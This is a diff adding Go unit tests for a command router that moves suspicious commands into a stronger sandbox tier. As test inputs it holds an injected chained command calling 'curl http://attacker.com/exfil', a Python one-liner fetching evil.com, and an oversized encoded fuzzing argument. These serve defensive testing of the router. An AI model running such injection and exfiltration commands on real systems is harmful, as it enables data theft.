@@ -402,3 +402,89 @@ func TestRoute_ShieldProxyInjection(t *testing.T) {
 		t.Errorf("expected HTTP_PROXY injected with %s, got env: %v", addr, dec.InjectedEnv)
 	}
 }
+
+func TestRoute_DynamicTierEscalation_SubshellChaining(t *testing.T) {
+	opts := &ExecutionOptions{Quiet: true, DryRun: true}
+	cmd := []string{"git", "log", "-n", "1", "; curl http://attacker.com/exfil"}
+
+	dec, err := Route(opts, cmd)
+	if err != nil {
+		t.Fatalf("Route failed: %v", err)
+	}
+
+	if dec.Tier != policy.Tier2 {
+		t.Errorf("expected command chaining to escalate to Tier2, got %v", dec.Tier)
+	}
+	if !strings.Contains(dec.Reason, "dynamic tier escalation") {
+		t.Errorf("expected reason to mention dynamic tier escalation, got: %s", dec.Reason)
+	}
+}
+
+func TestRoute_DynamicTierEscalation_DifferentialFuzzingPayload(t *testing.T) {
+	opts := &ExecutionOptions{Quiet: true, DryRun: true}
+	// Massive argument simulating differential fuzzing vector (>4096 bytes) on a Tier 1 tool (git log)
+	massiveArg := strings.Repeat("A%20%00", 1000)
+	cmd := []string{"git", "log", "--grep", massiveArg}
+
+	dec, err := Route(opts, cmd)
+	if err != nil {
+		t.Fatalf("Route failed: %v", err)
+	}
+
+	if dec.Tier != policy.Tier2 {
+		t.Errorf("expected massive fuzzing payload to escalate to Tier2, got %v", dec.Tier)
+	}
+	if !strings.Contains(dec.Reason, "dynamic tier escalation") {
+		t.Errorf("expected reason to mention dynamic tier escalation, got: %s", dec.Reason)
+	}
+}
+
+func TestRoute_DynamicTierEscalation_InlineEvalNetwork(t *testing.T) {
+	opts := &ExecutionOptions{Quiet: true, DryRun: true}
+	cmd := []string{"python3", "-c", "import socket, urllib.request; urllib.request.urlopen('http://evil.com')"}
+
+	dec, err := Route(opts, cmd)
+	if err != nil {
+		t.Fatalf("Route failed: %v", err)
+	}
+
+	if dec.Tier != policy.Tier2 {
+		t.Errorf("expected inline eval with network to escalate to Tier2, got %v", dec.Tier)
+	}
+}
+
+func TestRoute_DynamicTierEscalation_AirgapPreserved(t *testing.T) {
+	// Airgap must NEVER escalate to Tier 2 because microVM lacks kernel-enforced airgap
+	opts := &ExecutionOptions{Airgap: true, Quiet: true, DryRun: true}
+	cmd := []string{"git", "status", "; curl http://attacker.com/exfil"}
+
+	dec, err := Route(opts, cmd)
+	if err != nil {
+		t.Fatalf("Route failed: %v", err)
+	}
+
+	if dec.Tier != policy.Tier1 {
+		t.Errorf("expected airgap to preserve Tier 1 kernel sandbox, got %v", dec.Tier)
+	}
+}
+
+func TestRoute_DynamicTierEscalation_BenignRemainsTier1(t *testing.T) {
+	opts := &ExecutionOptions{Quiet: true, DryRun: true}
+	benignCommands := [][]string{
+		{"git", "status"},
+		{"git", "log", "-n", "5"},
+		{"gofmt", "-w", "."},
+		{"ls", "-la"},
+		{"cat", "README.md"},
+	}
+
+	for _, cmd := range benignCommands {
+		dec, err := Route(opts, cmd)
+		if err != nil {
+			t.Fatalf("Route failed for %v: %v", cmd, err)
+		}
+		if dec.Tier != policy.Tier1 {
+			t.Errorf("expected benign command %v to stay on Tier 1, got %v (Reason: %s)", cmd, dec.Tier, dec.Reason)
+		}
+	}
+}
